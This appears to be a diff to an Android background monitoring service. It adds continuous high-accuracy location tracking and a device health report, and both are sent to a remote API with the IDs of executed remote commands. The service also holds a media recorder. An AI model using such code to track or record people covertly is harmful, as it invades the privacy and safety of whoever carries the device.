@@ -72,6 +72,7 @@ class MonitorService : Service(), LifecycleOwner {
         updateConfigFromPrefs(pref)
         
         startForegroundServiceNotification()
+        com.example.telegramsender.utils.LocationHelper.startListening(this)
         
         startLoops()
     }
@@ -100,6 +101,7 @@ class MonitorService : Service(), LifecycleOwner {
     // Cleanup
     override fun onDestroy() {
         super.onDestroy()
+        com.example.telegramsender.utils.LocationHelper.stopListening()
         job?.cancel()
         mediaRecorder?.release()
         lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
@@ -506,30 +508,19 @@ class MonitorService : Service(), LifecycleOwner {
             val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
             val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
 
-            // 2. Location
-            var lat: Double? = null
-            var lon: Double? = null
-            var accuracy: Float? = null
-            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
-                if (lm != null) {
-                    var bestLoc: android.location.Location? = null
-                    for (p in lm.getProviders(true)) {
-                        val l = lm.getLastKnownLocation(p) ?: continue
-                        if (bestLoc == null || l.accuracy < bestLoc.accuracy) bestLoc = l
-                    }
-                    if (bestLoc != null) {
-                        lat = bestLoc.latitude
-                        lon = bestLoc.longitude
-                        accuracy = bestLoc.accuracy
-                    }
-                }
-            }
+            // 2. High-Accuracy Location Fetch
+            val loc = com.example.telegramsender.utils.LocationHelper.getBestLocation(this)
+            val lat: Double? = loc?.latitude
+            val lon: Double? = loc?.longitude
+            val accuracy: Float? = loc?.accuracy
 
-            // 3. Pop executed command IDs
+            // 3. Health & Permissions check
+            val healthJson = com.example.telegramsender.utils.DeviceHealthHelper.getDeviceHealth(this).toJsonObject()
+
+            // 4. Pop executed command IDs
             val executedIds = com.example.telegramsender.data.DevicePreferences.getAndClearExecutedCommands(this)
 
-            // 4. Hit API
+            // 5. Hit API
             val result = com.example.telegramsender.network.ApiClient.syncDevice(
                 deviceJwt = jwt,
                 batteryLevel = batteryPct,
@@ -537,6 +528,7 @@ class MonitorService : Service(), LifecycleOwner {
                 latitude = lat,
                 longitude = lon,
                 accuracy = accuracy,
+                health = healthJson,
                 executedCommandIds = executedIds
             )
 
